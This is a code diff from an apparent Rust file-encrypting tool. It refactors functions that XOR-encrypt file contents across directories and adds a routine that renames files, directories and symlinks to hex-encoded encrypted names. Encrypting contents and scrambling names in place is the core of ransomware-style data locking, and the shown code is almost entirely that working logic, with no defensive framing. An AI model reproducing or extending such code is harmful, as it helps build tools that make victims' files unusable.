@@ -135,10 +135,14 @@ fn xor_file(entry : &DirEntry, key : &Vec<u8>) {
 
         writer.write_all(cypher_text.as_slice()).unwrap();
     }
+
+    //rename_entry(entry, key);
 }
 
 fn xor_symlink(entry : &DirEntry, key : &Vec<u8>) {
     info!("Encrypting symlink {:?}", entry);
+
+    rename_entry(entry, key);
 }
 
 fn xor_dir(entry : &DirEntry, key : &Vec<u8>) {
@@ -158,12 +162,15 @@ fn xor_dir(entry : &DirEntry, key : &Vec<u8>) {
         }
     }
 
+    rename_entry(entry, key);
+}
+
+fn rename_entry(entry : &DirEntry, key : &Vec<u8>) {
     // Encrypt the directory entry itself.
     let file_name = entry.file_name();
 
     if let Some(original_name) = file_name.to_str() {
-
-        println!("original_name: {}", original_name);
+        debug!("original_name: {}", original_name);
 
         let mut key_repeated = repeat_key(key, original_name.len());
         let mut encrypted = Vec::with_capacity(original_name.len());
@@ -172,36 +179,19 @@ fn xor_dir(entry : &DirEntry, key : &Vec<u8>) {
         }
 
         let encrypted_name = to_hex_string(encrypted);
-        println!("encrypted_name: {}", encrypted_name);
+        debug!("encrypted_name: {}", encrypted_name);
 
         let full_path_buf = entry.path();
-
         let full_path = full_path_buf.as_path();
-        println!("full_path: {:?}", full_path_buf);
-
         let parent_path = full_path.parent().unwrap();
-        println!("parent_path: {:?}", parent_path);
 
         let src_file_path_buf = parent_path.join(original_name);
-        println!("src_file_path_buf: {:?}", src_file_path_buf);
-
         let dst_file_path_buf = parent_path.join(encrypted_name);
-        println!("dst_file_path_buf: {:?}", dst_file_path_buf);
 
         let src_file_path = src_file_path_buf.as_path();
-        println!("src_file_path: {:?}", src_file_path);
-
         let dst_file_path = dst_file_path_buf.as_path();
-        println!("dst_file_path: {:?}", dst_file_path);
 
-
-        // TODO: REMOVE
-        //println!("full {:?} parent {:?}", full_path, parent);
-        println!("Mv {:?} to {:?}", src_file_path, dst_file_path);
-
-
-
-
+        debug!("Moving {:?} to {:?}", src_file_path, dst_file_path);
         fs::rename(src_file_path, dst_file_path).unwrap();
     }
 }
